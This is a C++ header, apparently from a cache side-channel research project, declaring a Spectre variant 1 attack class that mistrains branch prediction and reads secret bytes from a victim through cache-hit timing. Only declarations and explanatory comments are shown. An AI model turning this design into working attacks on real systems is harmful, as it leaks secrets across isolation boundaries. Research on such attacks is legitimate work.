//
// Created by sage on 1/13/21.
//

#ifndef CACHECASH_SPECTREV1_H
#define CACHECASH_SPECTREV1_H

#include <functional>
#include <cacheutils.h>

// void fn_vuln(size_t) is defined:
//      let k := *(p_base + x)
//      then p_scratchpad + k*block_len is brought into the cache
// Therefore, if we call fn_vuln(2), then we should see p_scratchpad + 2*block_len in the cache

// See tests/test_specv1.cpp for example use

// block_len must be at least the cache line size; a small block_len means poor accuracy
//      increasing n_max_tries and n_trainings can improve accuracy but will make each byte read slower

class Spectrev1 {
public:

    inline Spectrev1(
            void * const p_base,                         // base address from which we read secret
            void * const p_scratchpad,                   // probe array (must be writeable)
            std::function<void(size_t)> &&fn_vuln,          // calls the speculative function
            std::function<size_t(size_t)> &&fn_get_trainx,  // given a size_t, returns a legal argument for fn_vuln
            size_t block_len,                               // num bytes b/w monitored lines of p_scratchpad
            size_t n_max_tries,                             // max num attempts to read secret
            int n_trainings)                                // num times to send good arg to fn_vuln before sending bad arg
        : p_base(reinterpret_cast<uint8_t * const>(p_base)),
          p_scratchpad(reinterpret_cast<uint8_t * const>(p_scratchpad)),
          fn_vuln(fn_vuln),
          fn_get_trainx(fn_get_trainx),
          block_len(block_len),
          n_max_tries(n_max_tries),
          n_trainings(n_trainings),
          cachelinesize(get_cachelinesize())
    {}

    Spectrev1(Spectrev1 const &) = delete;
    Spectrev1 & operator=(Spectrev1 const &) = delete;

    // Read n_bytes from p_secret and write it to p_buf
    // Require: At least n_bytes allocated from p_buf
    volatile void read( void volatile * p_secret, size_t n_bytes, uint8_t *p_buf);

    // Read a byte from p_secret into p_val
    volatile void read_byte( void volatile * p_secret, uint8_t *p_val);

private:
    void do_attack(size_t train_x, size_t mal_x);
    void mistrain(size_t train_x, size_t mal_x);
    void find_hits(size_t train_x);
    uint8_t volatile * const p_base;
    uint8_t volatile * const p_scratchpad;
    std::function<volatile void(volatile size_t)> const fn_vuln;
    std::function<volatile size_t(volatile size_t)> const fn_get_trainx;
    const size_t block_len;
    const size_t n_max_tries;
    const int n_trainings;

    // Index of the two blocks (p_scratchpad + high*block_len) with the highest number of hits
    int16_t high;
    int16_t high2;

    const size_t cachelinesize;

    int results[MAX_BYTE];      // track hits in p_base
};


#endif //CACHECASH_SPECTREV1_H
